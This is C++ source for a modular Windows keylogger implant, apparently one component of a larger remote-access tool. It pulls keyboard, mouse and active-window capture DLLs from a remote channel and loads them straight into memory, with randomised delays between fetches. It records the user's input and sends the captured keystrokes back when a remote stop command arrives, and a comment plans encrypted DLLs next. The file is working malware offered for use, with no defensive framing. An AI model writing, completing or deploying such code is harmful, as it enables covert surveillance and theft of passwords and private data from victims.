//cl /EHsc .\keylogger.cpp .\MemoryModule.c /link ws2_32.lib user32.lib /OUT:keylogger.exe
//cl /EHsc /LD .\keylogger.cpp /link user32.lib
/*
    use encrypted dlls next
*/
#define WIN32_LEAN_AND_MEAN
#define DEBUG 1

#if DEBUG
    #include <iostream>
#endif
#include <windows.h>
#include <string>
#include <sstream>
#include <mutex>
#include <vector>

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void *vpDLL_k = nullptr, *vpDLL_m = nullptr, *vpDLL_w = nullptr;
bool running = true;
std::vector<std::string> shared_vector;

typedef struct INIT_PARAMS
{
    void* base_address;

    void* (*FindExportAddress)(HMODULE, const char*);
    void* (*MemoryLoadLibrary)(const void *, size_t);
    void (*MemoryFreeLibrary)(void*);
    void* (*MemoryGetBaseAddress)(void*);
}INIT_PARAMS;
INIT_PARAMS* pStruct = nullptr;

//------------------------------------------------------------------------------------------------------------------------------

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

//==============================================================================================================================

typedef void(*InitializeFunc)(std::vector<std::string>*);
typedef void(*CleanupFunc)();
InitializeFunc init_active_window, init_mouse, init_keyboard;
CleanupFunc cleanup_aw, cleanup_m, cleanup_kb;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int load_dlls();
BOOL CtrlHandler(DWORD fdwCtrlType);
int main_thing();

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

__declspec(dllexport) int target_init_KL(INIT_PARAMS* params)
{
    ::pStruct = params;

    receive_data_raw = (RecvDataRawFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");

    if(!receive_data || !send_data || !receive_data_raw)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses.\n";
        #endif

        return 0;
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    load_dlls();

    return 1;
}

int main_thing()
{

    std::atomic<bool> receivedTerminationSignal(false);

    // Set the console control handler
    if(!SetConsoleCtrlHandler(CtrlHandler, TRUE))
    {
        #if DEBUG
        std::cerr << "Error setting console control handler" << std::endl;
        #endif

        return 1;
    }

    init_active_window(&shared_vector);
    init_keyboard(&shared_vector);
    init_mouse(&shared_vector);

    std::thread terminationCheckThread([&]()
    {
        while(true)
        {
            std::string a = receive_data("klogger_cmd.txt");
            if(a[0] == 's')
            {
                receivedTerminationSignal = true;
                send_data("klogger_cmd.txt","`");

                std::ostringstream oss;
                for (const auto& entry : shared_vector) oss << entry;
                send_data("key_strokes.txt",oss.str());

                cleanup_kb();
                cleanup_m();
                cleanup_aw();
                break; 
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
        }
    });
    
    // Main thread continues to process Windows messages
    MSG msg;
    while (!receivedTerminationSignal)
    {
        if(PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    terminationCheckThread.join();

    // My_Free_Lib(hDLL_n);
    //MemoryFreeLibrary(hDLL_k);
    //MemoryFreeLibrary(hDLL_m);
    //MemoryFreeLibrary(hDLL_w);

    return 0;
}

int load_dlls()
{

    //------------------------------------------------------------------------------------------------------------------------------

    std::vector<unsigned char> vdll_k, vdll_m, vdll_w;

    vdll_k = receive_data_raw("keylog_k_lib.dll");
    std::this_thread::sleep_for(std::chrono::milliseconds(50 + (rand() % 100)));
    vdll_m = receive_data_raw("keylog_m_lib.dll");
    std::this_thread::sleep_for(std::chrono::milliseconds(50 + (rand() % 100)));
    vdll_w = receive_data_raw("keylog_w_lib.dll");

    //------------------------------------------------------------------------------------------------------------------------------

    vpDLL_k = pStruct->MemoryLoadLibrary(vdll_k.data(), vdll_k.size());
    if(vpDLL_k == nullptr)
    {
        #if DEBUG
        std::cerr << "Failed to load DLL from memory.\n";
        #endif

        return 0;
    }

    init_keyboard = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_k), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_kb = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_k), "?Cleanup@@YAXXZ");
    if(!init_keyboard || !cleanup_kb)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
        #endif
        
        pStruct->MemoryFreeLibrary(vpDLL_k);
        return 0;
    }

    // //------------------------------------------------------------------------------------------------------------------------------

    vpDLL_m = pStruct->MemoryLoadLibrary(vdll_m.data(), vdll_m.size());
    if(vpDLL_m == nullptr)
    {
        #if DEBUG
        std::cerr << "Failed to load DLL from memory.\n";
        #endif

        return 0;
    }

    init_mouse = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_m), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_m = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_m), "?Cleanup@@YAXXZ");
    if(!init_mouse || !cleanup_m)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
        #endif

        pStruct->MemoryFreeLibrary(vpDLL_m);
        return 0;
    }

    // //------------------------------------------------------------------------------------------------------------------------------

    vpDLL_w = pStruct->MemoryLoadLibrary(vdll_w.data(), vdll_w.size());
    if(vpDLL_w == nullptr)
    {
        #if DEBUG
        std::cerr << "Failed to load DLL from memory.\n";
        #endif

        return 0;
    }

    init_active_window = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_w), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_aw = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_w), "?Cleanup@@YAXXZ");
    if(!init_active_window || !cleanup_aw)
    {
        #if DEBUG
        std::cerr << "Failed to get one or more function addresses for init_active_window dll.\n";
        #endif

        pStruct->MemoryFreeLibrary(vpDLL_w);
        return 0;
    }
    //------------------------------------------------------------------------------------------------------------------------------
    return 1;
}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
        {
            running = false;
            
            cleanup_kb();
            cleanup_m();
            cleanup_aw();

            pStruct->MemoryFreeLibrary(vpDLL_k);
            pStruct->MemoryFreeLibrary(vpDLL_m);
            pStruct->MemoryFreeLibrary(vpDLL_w);

            return TRUE;
        }
        default:
        {
            return FALSE;
        }
    }
}

